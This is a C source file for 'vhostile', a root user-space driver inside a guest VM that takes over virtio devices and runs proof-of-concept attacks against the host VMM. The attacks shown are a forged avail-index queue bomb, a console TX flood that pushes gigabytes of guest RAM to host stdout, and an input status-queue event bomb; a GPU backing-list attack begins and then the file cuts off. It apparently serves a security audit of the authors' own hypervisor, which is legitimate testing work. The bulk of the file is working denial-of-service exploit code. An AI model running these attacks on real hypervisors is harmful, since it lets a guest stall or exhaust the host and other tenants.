/*
 * vhostile: a hostile virtio-pci driver that runs in guest user space as root.
 *
 * It takes a virtio device away from the guest kernel (sysfs unbind), maps
 * the device's BAR0 (sysfs resource0), finds the virtio structures from the
 * vendor capabilities in PCI config space, negotiates VERSION_1 and then
 * drives split virtqueues that live in its own hugepages, whose
 * guest-physical addresses it reads from /proc/self/pagemap. No interrupts:
 * it polls the used ring. Each subcommand is the guest half of one
 * proof-of-concept in poc/run.py, which judges the outcome on the host. A
 * few (bar-remap, sentinel, net-reach, plant-grub) act through the kernel's
 * own drivers instead.
 *
 * Everything it reports is a line starting "[poc] " on /dev/kmsg (which the
 * kernel prints on hvc0, i.e. the VMM's stdout), or, once it has taken over
 * the console device itself, a line it sends through its own TX queue.
 *
 * SAFETY: every queue notification goes through vq_kick(), which refuses to
 * go past KICK_BUDGET per run. (Windows' vid.sys can hang for good when a
 * doorbell that has been rung tens of millions of times is unregistered.)
 *
 * Build: zig cc -target x86_64-linux-musl -static -O2 -o vhostile vhostile.c
 */
#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <inttypes.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/reboot.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>

#define KICK_BUDGET 50000u

#define VIRTIO_VENDOR 0x1af4
#define PCI_ID_NET 0x1041
#define PCI_ID_BLK 0x1042
#define PCI_ID_CONSOLE 0x1043
#define PCI_ID_RNG 0x1044
#define PCI_ID_9P 0x1049
#define PCI_ID_GPU 0x1050
#define PCI_ID_INPUT 0x1052

#define ST_ACK 1
#define ST_DRIVER 2
#define ST_DRIVER_OK 4
#define ST_FEATURES_OK 8
#define ST_NEEDS_RESET 64

#define F_VERSION_1 (1ull << 32)

/* virtio_pci_common_cfg offsets */
#define CC_DFSEL 0x00
#define CC_DF 0x04
#define CC_GFSEL 0x08
#define CC_GF 0x0c
#define CC_MSIX 0x10
#define CC_NUMQ 0x12
#define CC_STATUS 0x14
#define CC_GEN 0x15
#define CC_QSEL 0x16
#define CC_QSIZE 0x18
#define CC_QVEC 0x1a
#define CC_QEN 0x1c
#define CC_QNOFF 0x1e
#define CC_QDESC 0x20
#define CC_QAVAIL 0x28
#define CC_QUSED 0x30

#define D_NEXT 1
#define D_WRITE 2

#define HP_SIZE (2ul << 20)

static const char SENTINEL[] = "=== tinyvmm shutdown requested ===";

/* ------------------------------------------------------------------ args */

static int g_argc;
static char **g_argv;

static const char *opt_str(const char *key, const char *def)
{
	size_t n = strlen(key);
	for (int i = 0; i < g_argc; i++)
		if (!strncmp(g_argv[i], key, n) && g_argv[i][n] == '=')
			return g_argv[i] + n + 1;
	return def;
}

static uint64_t opt_u64(const char *key, uint64_t def)
{
	const char *s = opt_str(key, NULL);
	return s ? strtoull(s, NULL, 0) : def;
}

/* --------------------------------------------------------------- logging */

static void con_send(const void *data, size_t len);
static int g_console_tx; /* report through our own console TX queue */

static void emit_line(const char *s)
{
	if (g_console_tx) {
		char buf[1024];
		int n = snprintf(buf, sizeof buf, "\n%s\n", s);
		con_send(buf, (size_t)n);
		return;
	}
	/* One open per line: /dev/kmsg rate-limits per open file. The newline
	 * matters: without it the kernel holds the record back as a possible
	 * continuation and prints it only when the next one arrives. */
	char line[1024];
	int n = snprintf(line, sizeof line, "%s\n", s);
	int fd = open("/dev/kmsg", O_WRONLY | O_CLOEXEC);
	if (fd >= 0) {
		if (write(fd, line, (size_t)n) < 0)
			dprintf(1, "%s", line);
		close(fd);
	} else {
		dprintf(1, "%s", line);
	}
}

__attribute__((format(printf, 1, 2))) static void say(const char *fmt, ...)
{
	char buf[900];
	int n = snprintf(buf, sizeof buf, "[poc] ");
	va_list ap;
	va_start(ap, fmt);
	vsnprintf(buf + n, sizeof buf - (size_t)n, fmt, ap);
	va_end(ap);
	emit_line(buf);
}

__attribute__((format(printf, 1, 2), noreturn)) static void die(const char *fmt, ...)
{
	char buf[900];
	int n = snprintf(buf, sizeof buf, "[poc] ERROR ");
	va_list ap;
	va_start(ap, fmt);
	vsnprintf(buf + n, sizeof buf - (size_t)n, fmt, ap);
	va_end(ap);
	emit_line(buf);
	exit(2);
}

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return (double)ts.tv_sec * 1e3 + (double)ts.tv_nsec / 1e6;
}

static void spin_us(unsigned us)
{
	double end = now_ms() + us / 1e3;
	while (now_ms() < end)
		;
}

static void msleep(unsigned ms)
{
	struct timespec ts = { ms / 1000, (long)(ms % 1000) * 1000000L };
	while (nanosleep(&ts, &ts) < 0 && errno == EINTR)
		;
}

/* ------------------------------------------------------------ small files */

static int read_file(const char *path, char *buf, size_t cap)
{
	int fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;
	ssize_t n = read(fd, buf, cap - 1);
	close(fd);
	if (n < 0)
		return -1;
	buf[n] = 0;
	while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == ' '))
		buf[--n] = 0;
	return (int)n;
}

static int write_file(const char *path, const char *s)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;
	ssize_t n = write(fd, s, strlen(s));
	int e = errno;
	close(fd);
	errno = e;
	return n < 0 ? -1 : 0;
}

/* ------------------------------------------------------------------ MMIO */
/* Plain MOVs, as the kernel's readl/writel are: the VMM emulates the
 * faulting instruction, and these are the forms every emulator knows. */

static inline uint8_t mr8(const volatile void *p)
{
	uint8_t v;
	__asm__ volatile("movb (%1), %0" : "=q"(v) : "r"(p) : "memory");
	return v;
}
static inline uint16_t mr16(const volatile void *p)
{
	uint16_t v;
	__asm__ volatile("movw (%1), %0" : "=r"(v) : "r"(p) : "memory");
	return v;
}
static inline uint32_t mr32(const volatile void *p)
{
	uint32_t v;
	__asm__ volatile("movl (%1), %0" : "=r"(v) : "r"(p) : "memory");
	return v;
}
static inline void mw8(volatile void *p, uint8_t v)
{
	__asm__ volatile("movb %0, (%1)" : : "q"(v), "r"(p) : "memory");
}
static inline void mw16(volatile void *p, uint16_t v)
{
	__asm__ volatile("movw %0, (%1)" : : "r"(v), "r"(p) : "memory");
}
static inline void mw32(volatile void *p, uint32_t v)
{
	__asm__ volatile("movl %0, (%1)" : : "r"(v), "r"(p) : "memory");
}

/* ------------------------------------------------------------- hugepages */
/* Each 2 MiB hugepage is one physically contiguous arena whose GPA is known. */

struct hpage {
	uint8_t *va;
	uint64_t gpa;
	size_t used;
};

static struct hpage g_hp[64];
static unsigned g_hp_n, g_hp_next;

static void hp_pool_init(unsigned n)
{
	char buf[64];
	if (n > 64)
		n = 64;
	snprintf(buf, sizeof buf, "%u", n);
	if (write_file("/proc/sys/vm/nr_hugepages", buf) < 0)
		die("nr_hugepages: %s", strerror(errno));
	uint8_t *base = mmap(NULL, (size_t)n * HP_SIZE, PROT_READ | PROT_WRITE,
			     MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB | MAP_POPULATE, -1, 0);
	if (base == MAP_FAILED)
		die("mmap(%u hugepages): %s", n, strerror(errno));
	mlock(base, (size_t)n * HP_SIZE);
	int pm = open("/proc/self/pagemap", O_RDONLY | O_CLOEXEC);
	if (pm < 0)
		die("pagemap: %s", strerror(errno));
	for (unsigned i = 0; i < n; i++) {
		uint8_t *va = base + (size_t)i * HP_SIZE;
		memset(va, 0, HP_SIZE);
		uint64_t ent = 0;
		if (pread(pm, &ent, 8, (off_t)((uintptr_t)va / 4096 * 8)) != 8)
			die("pagemap read: %s", strerror(errno));
		if (!(ent >> 63))
			die("hugepage %u not present", i);
		uint64_t gpa = (ent & ((1ull << 55) - 1)) * 4096;
		if (gpa == 0 || (gpa & (HP_SIZE - 1)))
			die("hugepage %u: bad GPA 0x%" PRIx64 " (pagemap hides PFNs?)", i, gpa);
		g_hp[i].va = va;
		g_hp[i].gpa = gpa;
		g_hp[i].used = 0;
	}
	close(pm);
	g_hp_n = n;
	g_hp_next = 0;
}

static struct hpage *hp_get(void)
{
	if (g_hp_next >= g_hp_n)
		die("out of hugepages (%u)", g_hp_n);
	return &g_hp[g_hp_next++];
}

static void *hp_carve(struct hpage *h, size_t len, size_t align, uint64_t *gpa)
{
	size_t off = (h->used + align - 1) & ~(align - 1);
	if (off + len > HP_SIZE)
		die("hugepage arena full (%zu + %zu)", off, len);
	h->used = off + len;
	if (gpa)
		*gpa = h->gpa + off;
	return h->va + off;
}

/* ---------------------------------------------------------------- device */

struct vdev {
	char bdf[32];
	char dir[160];
	uint16_t pci_id;
	int cfg_fd;
	volatile uint8_t *bar;
	volatile uint8_t *common, *notify, *isr, *devcfg;
	uint32_t notify_mult;
	uint64_t features;
};

struct vdesc {
	uint64_t addr;
	uint32_t len;
	uint16_t flags;
	uint16_t next;
};

struct vq {
	struct vdev *d;
	uint16_t idx, size, notify_off;
	struct vdesc *desc;
	volatile uint16_t *avail; /* [0] flags, [1] idx, [2..] ring */
	volatile uint8_t *used;	  /* u16 flags, u16 idx, {u32 id, u32 len}[] */
	uint64_t desc_gpa, avail_gpa, used_gpa;
	uint16_t avail_idx; /* what we last published */
};

static uint64_t g_kicks;

/* Find the nth (0-based) virtio PCI function with this PCI device id. */
static int vdev_find(struct vdev *d, uint16_t pci_id, int nth)
{
	DIR *dir = opendir("/sys/bus/pci/devices");
	if (!dir)
		return -1;
	char names[64][32];
	int n = 0;
	struct dirent *e;
	while ((e = readdir(dir)) && n < 64) {
		if (e->d_name[0] == '.')
			continue;
		snprintf(names[n++], sizeof names[0], "%s", e->d_name);
	}
	closedir(dir);
	/* readdir order is arbitrary: sort by name (= by slot). */
	for (int i = 0; i < n; i++)
		for (int j = i + 1; j < n; j++)
			if (strcmp(names[i], names[j]) > 0) {
				char t[32];
				memcpy(t, names[i], 32);
				memcpy(names[i], names[j], 32);
				memcpy(names[j], t, 32);
			}
	for (int i = 0; i < n; i++) {
		char path[200], buf[32];
		snprintf(path, sizeof path, "/sys/bus/pci/devices/%s/vendor", names[i]);
		if (read_file(path, buf, sizeof buf) < 0 || strtoul(buf, NULL, 0) != VIRTIO_VENDOR)
			continue;
		snprintf(path, sizeof path, "/sys/bus/pci/devices/%s/device", names[i]);
		if (read_file(path, buf, sizeof buf) < 0 || strtoul(buf, NULL, 0) != pci_id)
			continue;
		if (nth-- > 0)
			continue;
		memset(d, 0, sizeof *d);
		snprintf(d->bdf, sizeof d->bdf, "%s", names[i]);
		snprintf(d->dir, sizeof d->dir, "/sys/bus/pci/devices/%s", names[i]);
		d->pci_id = pci_id;
		d->cfg_fd = -1;
		return 0;
	}
	return -1;
}

static uint32_t cfg_read(struct vdev *d, unsigned off, unsigned size)
{
	uint32_t v = 0;
	if (pread(d->cfg_fd, &v, size, off) != (ssize_t)size)
		die("%s: config read @0x%x: %s", d->bdf, off, strerror(errno));
	return v;
}

static void cfg_write(struct vdev *d, unsigned off, unsigned size, uint32_t v)
{
	if (pwrite(d->cfg_fd, &v, size, off) != (ssize_t)size)
		die("%s: config write @0x%x: %s", d->bdf, off, strerror(errno));
}

static void vdev_open_cfg(struct vdev *d)
{
	char path[200];
	snprintf(path, sizeof path, "%s/config", d->dir);
	d->cfg_fd = open(path, O_RDWR | O_CLOEXEC);
	if (d->cfg_fd < 0)
		die("%s: open config: %s", d->bdf, strerror(errno));
}

/* Take the device from the kernel and map its virtio structures. */
static void vdev_takeover(struct vdev *d)
{
	char path[200], buf[64];
	struct stat st;

	snprintf(path, sizeof path, "%s/driver", d->dir);
	if (lstat(path, &st) == 0) {
		snprintf(path, sizeof path, "%s/driver/unbind", d->dir);
		if (write_file(path, d->bdf) < 0)
			die("%s: unbind: %s", d->bdf, strerror(errno));
		snprintf(path, sizeof path, "%s/driver", d->dir);
		for (int i = 0; i < 200 && lstat(path, &st) == 0; i++)
			msleep(5);
	}
	snprintf(path, sizeof path, "%s/enable", d->dir);
	if (read_file(path, buf, sizeof buf) >= 0 && buf[0] == '0')
		if (write_file(path, "1") < 0)
			die("%s: enable: %s", d->bdf, strerror(errno));
	vdev_open_cfg(d);
	uint16_t cmd = (uint16_t)cfg_read(d, 4, 2);
	if ((cmd & 0x6) != 0x6)
		cfg_write(d, 4, 2, cmd | 0x6); /* memory decode + bus master */

	snprintf(path, sizeof path, "%s/resource0", d->dir);
	int fd = open(path, O_RDWR | O_SYNC | O_CLOEXEC);
	if (fd < 0)
		die("%s: open resource0: %s", d->bdf, strerror(errno));
	if (fstat(fd, &st) < 0 || st.st_size < 0x3000)
		die("%s: resource0 is %lld bytes", d->bdf, (long long)st.st_size);
	d->bar = mmap(NULL, (size_t)st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (d->bar == MAP_FAILED)
		die("%s: mmap resource0: %s", d->bdf, strerror(errno));
	close(fd);

	/* Walk the capability list for the virtio vendor capabilities. */
	uint8_t cfg[256];
	if (pread(d->cfg_fd, cfg, sizeof cfg, 0) != (ssize_t)sizeof cfg)
		die("%s: read config space: %s", d->bdf, strerror(errno));
	if (!(cfg[6] & 0x10))
		die("%s: no capability list", d->bdf);
	for (unsigned p = cfg[0x34] & 0xfc, guard = 0; p && guard < 48; p = cfg[p + 1] & 0xfc, guard++) {
		if (cfg[p] != 0x09)
			continue;
		uint8_t type = cfg[p + 3], bar = cfg[p + 4];
		uint32_t off, len;
		memcpy(&off, cfg + p + 8, 4);
		memcpy(&len, cfg + p + 12, 4);
		if (bar != 0 || (uint64_t)off + len > (uint64_t)st.st_size)
			continue;
		switch (type) {
		case 1:
			d->common = d->bar + off;
			break;
		case 2:
			d->notify = d->bar + off;
			memcpy(&d->notify_mult, cfg + p + 16, 4);
			break;
		case 3:
			d->isr = d->bar + off;
			break;
		case 4:
			d->devcfg = d->bar + off;
			break;
		}
	}
	if (!d->common || !d->notify)
		die("%s: virtio capabilities missing", d->bdf);
}

static void vdev_open(struct vdev *d, uint16_t pci_id, int nth)
{
	if (vdev_find(d, pci_id, nth) < 0)
		die("no virtio device %04x #%d (is the VMM started with it?)", pci_id, nth);
	vdev_takeover(d);
}

static uint8_t vdev_status(struct vdev *d)
{
	return mr8(d->common + CC_STATUS);
}

/* Write status 0 and wait for the device to say it is done. Returns ms. */
static double vdev_reset(struct vdev *d)
{
	double t0 = now_ms();
	mw8(d->common + CC_STATUS, 0);
	while (vdev_status(d) != 0) {
		if (now_ms() - t0 > 10000)
			die("%s: reset did not complete in 10 s (status 0x%x)", d->bdf, vdev_status(d));
		spin_us(50);
	}
	return now_ms() - t0;
}

/* Reset, then negotiate VERSION_1 plus whatever of `want` the device has. */
static void vdev_init(struct vdev *d, uint64_t want)
{
	vdev_reset(d);
	mw8(d->common + CC_STATUS, ST_ACK);
	mw8(d->common + CC_STATUS, ST_ACK | ST_DRIVER);
	mw32(d->common + CC_DFSEL, 0);
	uint64_t f = mr32(d->common + CC_DF);
	mw32(d->common + CC_DFSEL, 1);
	f |= (uint64_t)mr32(d->common + CC_DF) << 32;
	d->features = f;
	if (!(f & F_VERSION_1))
		die("%s: device lacks VERSION_1 (features 0x%" PRIx64 ")", d->bdf, f);
	uint64_t g = F_VERSION_1 | (f & want);
	mw32(d->common + CC_GFSEL, 0);
	mw32(d->common + CC_GF, (uint32_t)g);
	mw32(d->common + CC_GFSEL, 1);
	mw32(d->common + CC_GF, (uint32_t)(g >> 32));
	mw8(d->common + CC_STATUS, ST_ACK | ST_DRIVER | ST_FEATURES_OK);
	if (!(vdev_status(d) & ST_FEATURES_OK))
		die("%s: FEATURES_OK refused (status 0x%x)", d->bdf, vdev_status(d));
}

static void vdev_driver_ok(struct vdev *d)
{
	mw8(d->common + CC_STATUS, ST_ACK | ST_DRIVER | ST_FEATURES_OK | ST_DRIVER_OK);
}

/* Carve zeroed rings for queue `idx` out of `h` and enable it. `size` 0
 * takes the device's maximum. */
static void vq_setup(struct vq *q, struct vdev *d, uint16_t idx, uint16_t size, struct hpage *h)
{
	memset(q, 0, sizeof *q);
	q->d = d;
	q->idx = idx;
	mw16(d->common + CC_QSEL, idx);
	uint16_t max = mr16(d->common + CC_QSIZE);
	if (max == 0)
		die("%s: queue %u does not exist", d->bdf, idx);
	q->size = size && size < max ? size : max;
	mw16(d->common + CC_QSIZE, q->size);
	q->desc = hp_carve(h, 16u * q->size, 4096, &q->desc_gpa);
	q->avail = hp_carve(h, 6u + 2u * q->size, 4096, &q->avail_gpa);
	q->used = hp_carve(h, 6u + 8u * q->size, 4096, &q->used_gpa);
	memset(q->desc, 0, 16u * q->size);
	memset((void *)q->avail, 0, 6u + 2u * q->size);
	memset((void *)q->used, 0, 6u + 8u * q->size);
	mw32(d->common + CC_QDESC, (uint32_t)q->desc_gpa);
	mw32(d->common + CC_QDESC + 4, (uint32_t)(q->desc_gpa >> 32));
	mw32(d->common + CC_QAVAIL, (uint32_t)q->avail_gpa);
	mw32(d->common + CC_QAVAIL + 4, (uint32_t)(q->avail_gpa >> 32));
	mw32(d->common + CC_QUSED, (uint32_t)q->used_gpa);
	mw32(d->common + CC_QUSED + 4, (uint32_t)(q->used_gpa >> 32));
	q->notify_off = mr16(d->common + CC_QNOFF);
	mw16(d->common + CC_QEN, 1);
	if (mr16(d->common + CC_QEN) != 1)
		die("%s: queue %u refused enable", d->bdf, idx);
}

/* After a device reset: zero the same rings and enable the queue again. */
static void vq_reprogram(struct vq *q)
{
	struct vdev *d = q->d;
	memset(q->desc, 0, 16u * q->size);
	memset((void *)q->avail, 0, 6u + 2u * q->size);
	memset((void *)q->used, 0, 6u + 8u * q->size);
	q->avail_idx = 0;
	mw16(d->common + CC_QSEL, q->idx);
	mw16(d->common + CC_QSIZE, q->size);
	mw32(d->common + CC_QDESC, (uint32_t)q->desc_gpa);
	mw32(d->common + CC_QDESC + 4, (uint32_t)(q->desc_gpa >> 32));
	mw32(d->common + CC_QAVAIL, (uint32_t)q->avail_gpa);
	mw32(d->common + CC_QAVAIL + 4, (uint32_t)(q->avail_gpa >> 32));
	mw32(d->common + CC_QUSED, (uint32_t)q->used_gpa);
	mw32(d->common + CC_QUSED + 4, (uint32_t)(q->used_gpa >> 32));
	mw16(d->common + CC_QEN, 1);
}

static void vq_desc(struct vq *q, unsigned i, uint64_t addr, uint32_t len, uint16_t flags,
		    uint16_t next)
{
	q->desc[i].addr = addr;
	q->desc[i].len = len;
	q->desc[i].flags = flags;
	q->desc[i].next = next;
}

/* Store avail.idx (the driver's "publish"), after everything else. */
static void vq_set_avail_idx(struct vq *q, uint16_t idx)
{
	q->avail_idx = idx;
	__atomic_store_n(&q->avail[1], idx, __ATOMIC_SEQ_CST);
}

/* Publish one more chain whose head is descriptor `head`. */
static void vq_publish(struct vq *q, uint16_t head)
{
	q->avail[2 + (q->avail_idx % q->size)] = head;
	vq_set_avail_idx(q, (uint16_t)(q->avail_idx + 1));
}

static uint16_t vq_used_idx(struct vq *q)
{
	return __atomic_load_n((volatile uint16_t *)(q->used + 2), __ATOMIC_SEQ_CST);
}

static void vq_used_elem(struct vq *q, uint16_t slot, uint32_t *id, uint32_t *len)
{
	volatile uint32_t *e = (volatile uint32_t *)(q->used + 4 + 8u * (slot % q->size));
	*id = e[0];
	*len = e[1];
}

/* The only place a queue is notified. */
static void vq_kick(struct vq *q)
{
	if (++g_kicks > KICK_BUDGET)
		die("kick budget (%u) exhausted: refusing to notify again", KICK_BUDGET);
	__sync_synchronize();
	mw16(q->d->notify + (size_t)q->notify_off * q->d->notify_mult, q->idx);
}

/* Poll until used.idx has reached `want` (or gone past it: a device may
 * retire several chains at once). Returns 0, or -1 after timeout_ms. */
static int vq_wait_used(struct vq *q, uint16_t want, unsigned timeout_ms)
{
	double end = now_ms() + timeout_ms;
	unsigned spins = 0;
	while ((int16_t)(vq_used_idx(q) - want) < 0) {
		if (now_ms() > end)
			return -1;
		if (++spins > 2000)
			usleep(100);
	}
	return 0;
}

/* ============================================================ avail-bomb */
/* Finding 2 (queue.rs pop_into): avail.idx is the guest's to write. One
 * chain is published, avail.idx says 65535 are, and one kick follows. */

static int poc_avail_bomb(void)
{
	uint32_t buflen = (uint32_t)opt_u64("buflen", 65536);
	struct vdev d;
	struct vq q;
	hp_pool_init(2);
	struct hpage *h = hp_get();
	vdev_open(&d, PCI_ID_RNG, 0);
	vdev_init(&d, 0);
	vq_setup(&q, &d, 0, 0, h);
	vdev_driver_ok(&d);

	uint64_t buf_gpa;
	uint8_t *buf = hp_carve(h, buflen, 4096, &buf_gpa);
	vq_desc(&q, 0, buf_gpa, buflen, D_WRITE, 0);
	for (unsigned i = 0; i < q.size; i++)
		q.avail[2 + i] = 0;

	/* An honest request first: the hostile driver works. */
	vq_set_avail_idx(&q, 1);
	vq_kick(&q);
	if (vq_wait_used(&q, 1, 3000) < 0)
		die("avail-bomb: the honest request was not served (used.idx=%u)", vq_used_idx(&q));
	uint32_t id, len, nz = 0;
	vq_used_elem(&q, 0, &id, &len);
	for (uint32_t i = 0; i < buflen; i++)
		nz += buf[i] != 0;
	say("avail-bomb: honest request served: used.len=%u nonzero_bytes=%u qsize=%u", len, nz, q.size);

	/* The bomb: nothing new is published, but avail.idx moves 0xFFFF on. */
	uint16_t before = vq_used_idx(&q);
	vq_set_avail_idx(&q, (uint16_t)(1 + 0xFFFF));
	double t0 = now_ms();
	vq_kick(&q);
	double kick_ms = now_ms() - t0;
	msleep(200);
	uint16_t delta = (uint16_t)(vq_used_idx(&q) - before);
	say("RESULT avail-bomb used_delta=%u kick_ms=%.1f qsize=%u buflen=%u", delta, kick_ms, q.size,
	    buflen);

	/* Whatever happened, a reset must give a working device back. */
	vdev_init(&d, 0);
	vq_reprogram(&q);
	vdev_driver_ok(&d);
	vq_desc(&q, 0, buf_gpa, buflen, D_WRITE, 0);
	vq_publish(&q, 0);
	vq_kick(&q);
	int ok = vq_wait_used(&q, 1, 3000) == 0;
	say("RESULT avail-bomb-recovery works_after_reset=%d", ok);
	return 0;
}

/* ========================================================= console-flood */
/* Finding 2 (console.rs drain_tx): a TX chain's descriptors can name any
 * amount of guest RAM, all of which went to the host's stdout. */

static struct {
	struct vdev d;
	struct vq tx;
	uint8_t *line;
	uint64_t line_gpa;
} g_con;

#define CON_LINE_DESC 0
#define CON_LINE_CAP 4096

/* Send bytes through the hostile console's TX queue and wait for them. */
static void con_send(const void *data, size_t len)
{
	if (len > CON_LINE_CAP)
		len = CON_LINE_CAP;
	memcpy(g_con.line, data, len);
	vq_desc(&g_con.tx, CON_LINE_DESC, g_con.line_gpa, (uint32_t)len, 0, 0);
	uint16_t want = (uint16_t)(vq_used_idx(&g_con.tx) + 1);
	vq_publish(&g_con.tx, CON_LINE_DESC);
	vq_kick(&g_con.tx);
	vq_wait_used(&g_con.tx, want, 5000);
}

static int poc_console_flood(void)
{
	uint64_t gpa = opt_u64("gpa", 0);
	uint64_t len1 = opt_u64("len1", 200ull << 20);
	uint64_t len2 = opt_u64("len2", 1ull << 30);
	unsigned wait2_ms = (unsigned)opt_u64("wait2_ms", 3000);
	if (!gpa)
		die("console-flood: gpa= (a guest-physical range to send) is required");

	hp_pool_init(2);
	struct hpage *h = hp_get();
	say("console-flood: taking the console device from the kernel; hvc0 goes away now");
	msleep(100);
	vdev_open(&g_con.d, PCI_ID_CONSOLE, 0);
	vdev_init(&g_con.d, 0);
	vq_setup(&g_con.tx, &g_con.d, 1, 0, h);
	vdev_driver_ok(&g_con.d);
	g_con.line = hp_carve(h, CON_LINE_CAP, 4096, &g_con.line_gpa);
	g_console_tx = 1;
	say("console-flood: hostile console driver is up (tx queue of %u)", g_con.tx.size);

	/* Phase 1: one chain, one descriptor, len1 bytes of guest RAM. */
	say("MARK flood1-begin bytes=%" PRIu64, len1);
	vq_desc(&g_con.tx, 1, gpa, (uint32_t)len1, 0, 0);
	uint16_t want = (uint16_t)(vq_used_idx(&g_con.tx) + 1);
	vq_publish(&g_con.tx, 1);
	double t0 = now_ms();
	vq_kick(&g_con.tx);
	int served1 = vq_wait_used(&g_con.tx, want, 120000) == 0;
	double ms1 = now_ms() - t0;
	say("MARK flood1-end served=%d ms=%.1f", served1, ms1);

	/* Phase 2: a full ring of chains, each len2 bytes. */
	unsigned n = g_con.tx.size;
	say("MARK flood2-begin chains=%u bytes_each=%" PRIu64, n, len2);
	for (unsigned i = 0; i < n; i++)
		vq_desc(&g_con.tx, i, gpa, (uint32_t)len2, 0, 0);
	uint16_t base = vq_used_idx(&g_con.tx);
	for (unsigned i = 0; i < n; i++)
		g_con.tx.avail[2 + ((g_con.tx.avail_idx + i) % n)] = (uint16_t)i;
	vq_set_avail_idx(&g_con.tx, (uint16_t)(g_con.tx.avail_idx + n));
	t0 = now_ms();
	vq_kick(&g_con.tx);
	int served2 = vq_wait_used(&g_con.tx, (uint16_t)(base + n), wait2_ms) == 0;
	double ms2 = now_ms() - t0;
	uint16_t done2 = (uint16_t)(vq_used_idx(&g_con.tx) - base);
	if (served2) {
		say("MARK flood2-end served=%u ms=%.1f", done2, ms2);
		say("RESULT console-flood flood1_ms=%.1f flood2_ms=%.1f flood2_chains_served=%u", ms1,
		    ms2, done2);
	}
	/* The host measures how long after its watchdog the VMM takes to exit. */
	for (;;)
		pause();
}

/* ===================================================== input-status-bomb */
/* Finding 2 (input.rs drain_status): every 8 bytes a statusq descriptor
 * names is an event the device decodes, on the vCPU thread. */

static int poc_input_status_bomb(void)
{
	uint64_t gpa = opt_u64("gpa", 0);
	uint64_t len = opt_u64("len", 512ull << 20);
	unsigned ndesc = (unsigned)opt_u64("ndesc", 64);
	unsigned nchains = (unsigned)opt_u64("nchains", 64);
	if (!gpa)
		die("input-status-bomb: gpa= is required");
	struct vdev d;
	struct vq q;
	hp_pool_init(2);
	struct hpage *h = hp_get();
	vdev_open(&d, PCI_ID_INPUT, 0);
	vdev_init(&d, 0);
	vq_setup(&q, &d, 1, 0, h);
	vdev_driver_ok(&d);
	if (ndesc > q.size)
		ndesc = q.size;
	if (nchains > q.size)
		nchains = q.size;

	/* An honest status event first (one 8-byte LED event). */
	uint64_t ev_gpa;
	uint8_t *ev = hp_carve(h, 8, 64, &ev_gpa);
	memset(ev, 0, 8);
	ev[0] = 0x11; /* EV_LED, code 0 (Num Lock), value 0 */
	vq_desc(&q, 0, ev_gpa, 8, 0, 0);
	vq_publish(&q, 0);
	vq_kick(&q);
	if (vq_wait_used(&q, 1, 3000) < 0)
		die("input-status-bomb: the honest status event was not served");
	say("input-status-bomb: honest status event served (qsize=%u)", q.size);

	for (unsigned i = 0; i < ndesc; i++)
		vq_desc(&q, i, gpa, (uint32_t)len, i + 1 < ndesc ? D_NEXT : 0, (uint16_t)(i + 1));
	for (unsigned i = 0; i < nchains; i++)
		q.avail[2 + ((q.avail_idx + i) % q.size)] = 0;
	uint16_t base = vq_used_idx(&q);
	double events = (double)nchains * ndesc * (double)(len / 8);
	say("MARK input-kick chains=%u descs=%u bytes_each=%" PRIu64 " events=%.3g", nchains, ndesc,
	    len, events);
	vq_set_avail_idx(&q, (uint16_t)(q.avail_idx + nchains));
	double t0 = now_ms();
	vq_kick(&q);
	double ms = now_ms() - t0;
	vq_wait_used(&q, (uint16_t)(base + nchains), 2000);
	say("RESULT input-status-bomb kick_ms=%.1f chains_served=%u events=%.3g", ms,
	    (uint16_t)(vq_used_idx(&q) - base), events);
	return 0;
}

/* =========================================================== gpu-backing */
/* Findings 2 and 10 (gpu.rs): backing lists were unbounded in total, and a
 * transfer rescanned the list for every row. */

#define GPU_CMD_CREATE_2D 0x0101
#define GPU_CMD_UNREF 0x0102
#define GPU_CMD_TRANSFER_2D 0x0105
#define GPU_CMD_ATTACH_BACKING 0x0106
#define GPU_RESP_OK_NODATA 0x1100
#define GPU_ENTRIES 65536u
#define GPU_ATTACH_LEN (32u + GPU_ENTRIES * 16u)

struct gpu {
	struct vdev d;
	struct vq q;
	uint8_t *req, *big;
	uint64_t req_gpa, big_gpa;
	uint8_t *resp;
	uint64_t resp_gpa;
};

static void put32(uint8_t *p, uint32_t v)
{
	memcpy(p, &v, 4);
}
static void put64(uint8_t *p, uint64_t v)
{
	memcpy(p, &v, 8);
}
static uint32_t get32(const uint8_t *p)
{
	uint32_t v;
	memcpy(&v, p, 4);
	return v;
}

/* Run the command at (gpa, len) as one chain; returns the response type. */
static uint32_t gpu_cmd(struct gpu *g, uint64_t gpa, uint32_t len)
{
	memset(g->resp, 0, 64);
	vq_desc(&g->q, 0, gpa, len, D_NEXT, 1);
	vq_desc(&g->q, 1, g->resp_gpa, 64, D_WRITE, 0);
	uint16_t want = (uint16_t)(vq_used_idx(&g->q) + 1);
	vq_publish(&g->q, 0);
	vq_kick(&g->q);
	if (vq_wait_used(&g->q, want, 120000) < 0)
		die("gpu: command 0x%x not answered", get32(g->req));
	return get32(g->resp);
}

static uint32_t gpu_create(struct gpu *g, uint32_t id, uint32_t w, uint32_t h)
{
	memset(g->req, 0, 64);
	put32(g->req, GPU_CMD_CREATE_2D);
	put32(g->req + 24, id);
	put32(g->req + 28, 1); /* B8G8R8A8_UNORM */
	put32(g->req + 32, w);
	put32(g->req + 36, h);
	return gpu_cmd(g, g->req_gpa, 40);
}

static int poc_gpu_backing(void)
{
	unsigned nres = (unsigned)opt_u64("resources", 1024);
	unsigned nxfer = (unsigned)opt_u64("transfers", 16);
	struct gpu g;
	memset(&g, 0, sizeof g);
	hp_pool_init(4);
	struct hpage *h = hp_get(), *hbig = hp_get(), *hpix = hp_get();
	vdev_open(&g.d, PCI_ID_GPU, 0);
